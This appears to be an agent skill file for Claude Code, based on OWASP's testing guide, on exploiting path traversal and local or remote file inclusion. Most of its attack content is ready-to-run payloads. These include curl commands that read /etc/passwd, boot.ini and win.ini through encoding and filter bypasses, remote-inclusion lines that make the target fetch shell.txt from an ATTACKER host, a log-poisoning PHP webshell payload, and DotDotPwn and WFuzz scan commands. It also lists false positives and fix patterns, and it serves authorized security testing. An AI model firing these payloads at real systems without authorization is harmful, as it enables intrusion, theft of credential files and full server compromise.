---
name: path-traversal
description: >
  Exploit path traversal and local/remote file inclusion (LFI/RFI) via URL parameters, cookies,
  and hidden fields using ../ sequences, URL encoding (%2e%2e%2f), double encoding (%252e%252e%255c),
  Unicode bypasses (..%c0%af), and Windows UNC paths. PHP include/require with $_GET/$_POST/$_COOKIE
  pattern. Target /etc/passwd, boot.ini, web.config. Tools: DotDotPwn, WFuzz, Burp Suite, ZAP.
license: MIT
compatibility: Designed for Claude Code. Requires Burp Suite, DotDotPwn, or WFuzz.
metadata:
  category: web
  version: "0.1"
  source: https://owasp.org/www-project-web-security-testing-guide/stable/
  wstg: WSTG-ATHZ-01
---

# Path Traversal and File Inclusion

## What Is Broken and Why

Applications that construct file paths from user-supplied input without proper canonicalization
and boundary enforcement allow attackers to escape the intended directory. On Linux/Unix, this
enables reading `/etc/passwd`, SSH keys, application configuration files, and source code. On
Windows, `boot.ini`, `win.ini`, and SAM hive files become accessible. Remote File Inclusion (RFI)
extends the impact to arbitrary code execution by loading attacker-controlled URLs as server-side
scripts. Inadequate sanitization — including blacklisting only specific sequences — is routinely
bypassed through encoding variants.

## Key Signals

- Parameters named `file=`, `path=`, `item=`, `page=`, `template=`, `home=`, `style=`, `lang=`
- Cookie values like `TEMPLATE=flower` or `PSTYLE=GreenDotRed` containing file references
- PHP source pattern: `(include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)`
- File upload functionality that stores and later serves files based on user-supplied filenames
- Server error messages revealing absolute file paths on failed inclusion
- Application serving static-looking content with dynamic file parameters
- ASP/JSP/PHP pages that appear to aggregate or display file contents based on URL parameter

## Methodology

1. **Enumerate input vectors**: Map all GET, POST, cookie, and hidden field parameters; identify
   any that appear to reference file names, paths, templates, or content identifiers.
2. **Baseline test**: Submit simple `../` sequences against each candidate parameter; observe
   response differences (size, content, error messages).
3. **Encoding variants**: If simple traversal is blocked, try URL, double, Unicode, and
   OS-specific encoding variants.
4. **Sanitization bypass**: If partial sanitization detected, test bypass patterns (nested
   `....//`, spaces, extra periods, backslash mixing).
5. **OS-specific targets**: Test Unix targets (`/etc/passwd`) and Windows targets (`../../boot.ini`,
   `../../windows/win.ini`).
6. **LFI to RFI probe**: If LFI confirmed, test `http://`, `https://`, `ftp://`, `file://`
   prefixes for remote inclusion.
7. **LFI to code execution**: Test PHP wrappers (`php://filter`, `php://input`, `data://`),
   log poisoning, and session file inclusion chains.

## Payloads & Tools

```bash
# Basic traversal — Unix
curl "https://TARGET/getUserProfile.jsp?item=../../../../etc/passwd"
curl "https://TARGET/index.php?file=../../../etc/passwd"

# Basic traversal — Windows
curl "https://TARGET/index.asp?file=..\..\..\..\boot.ini"
curl "https://TARGET/index.asp?file=../../../../windows/win.ini"

# URL encoding bypass
curl "https://TARGET/index.php?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
# ../ = %2e%2e%2f

# Double URL encoding bypass
curl "https://TARGET/index.php?file=%252e%252e%255cetc%255cpasswd"

# Unicode/UTF-8 bypass
curl "https://TARGET/index.php?file=..%c0%afetc%c0%afpasswd"
curl "https://TARGET/index.php?file=..%c1%9cwindows%c1%9cwin.ini"

# Sanitization bypass — nested sequences (defeats Replace("../",""))
curl "https://TARGET/index.php?file=....//....//etc/passwd"
curl "https://TARGET/index.php?file=....\\....\\boot.ini"

# Windows UNC path
curl "https://TARGET/index.php?file=\\\\ATTACKER\\share\\malicious.txt"

# Remote file inclusion
curl "https://TARGET/index.php?file=http://ATTACKER/shell.txt"
curl "https://TARGET/index.php?file=ftp://ATTACKER/shell.txt"

# PHP filter wrapper (LFI — read source base64 encoded)
curl "https://TARGET/index.php?file=php://filter/convert.base64-encode/resource=index.php"

# Cookie-based traversal
curl "https://TARGET/page" -H "Cookie: PSTYLE=../../../../etc/passwd"

# DotDotPwn automated scan
dotdotpwn -m http -h TARGET -f /etc/passwd -k "root:" -d 6

# WFuzz path traversal fuzz
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/Traversal.txt \
  "https://TARGET/index.php?file=FUZZ"
```

## Bypass Techniques

- **Null byte**: `../../../etc/passwd%00.jpg` — truncates extension check (PHP < 5.3.4).
- **Extra dots/spaces**: `.. /`, `..%20/`, `....` — confuse regex-based filters.
- **Mixed slashes**: `..\/` or `..\\/` — bypass OS-specific separator checks.
- **Absolute path**: If traversal is stripped, try absolute path directly: `/etc/passwd`.
- **PHP wrappers**: `php://filter`, `data://text/plain;base64,...`, `expect://id`.
- **Path length truncation**: Very long paths may truncate at OS limit, dropping appended suffix.
- **Encoding chain**: Mix URL + HTML entity encoding to evade WAF pattern matching.

## Exploitation Scenarios

**Scenario 1 — Read /etc/passwd via URL Parameter**
Setup: `https://TARGET/getUserProfile.jsp?item=ikki.html` serves profile content from disk.
Trigger: Change `item=../../../../etc/passwd`; server returns passwd file content in response.
Impact: Username enumeration, identification of service accounts, OSINT for further attacks.

**Scenario 2 — LFI via Cookie to Code Execution (Log Poisoning)**
Setup: LFI confirmed via `TEMPLATE` cookie; application logs User-Agent to a predictable path.
Trigger: Send request with `User-Agent: <?php system($_GET['cmd']); ?>` to poison the log file;
then include log via LFI with `cmd=id`.
Impact: Remote code execution on the server.

**Scenario 3 — RFI for Webshell Deployment**
Setup: PHP `include($_GET['page'])` without `allow_url_fopen=Off`.
Trigger: `page=http://ATTACKER/webshell.txt` — attacker hosts a PHP webshell as `.txt` to bypass
extension checks; server fetches and executes it.
Impact: Full server compromise via interactive webshell.

## False Positives

- A parameter named `file=` may reference an internal enum or database key, not an actual
  filesystem path; confirm by observing whether traversal sequences produce different responses.
- `../` in a URL fragment that appears in logs but is normalized by the framework before reaching
  application code is not exploitable.
- 500 errors on traversal attempts may indicate the path was processed but file not found, not
  that traversal is blocked.

## Fix Patterns

- Canonicalize paths using `realpath()` (PHP) or equivalent; verify the resolved path starts
  within the allowed base directory before opening.
- Use a whitelist of allowed file identifiers mapped server-side to paths; never pass user input
  directly to filesystem functions.
- Disable `allow_url_include` and `allow_url_fopen` in PHP configuration.
- Disable RFI at the WAF/server level; block outbound HTTP from application tier where possible.
- Run application processes with minimal filesystem permissions.
- Apply input validation rejecting `.`, `%`, `\`, `/` sequences in file-referencing parameters.
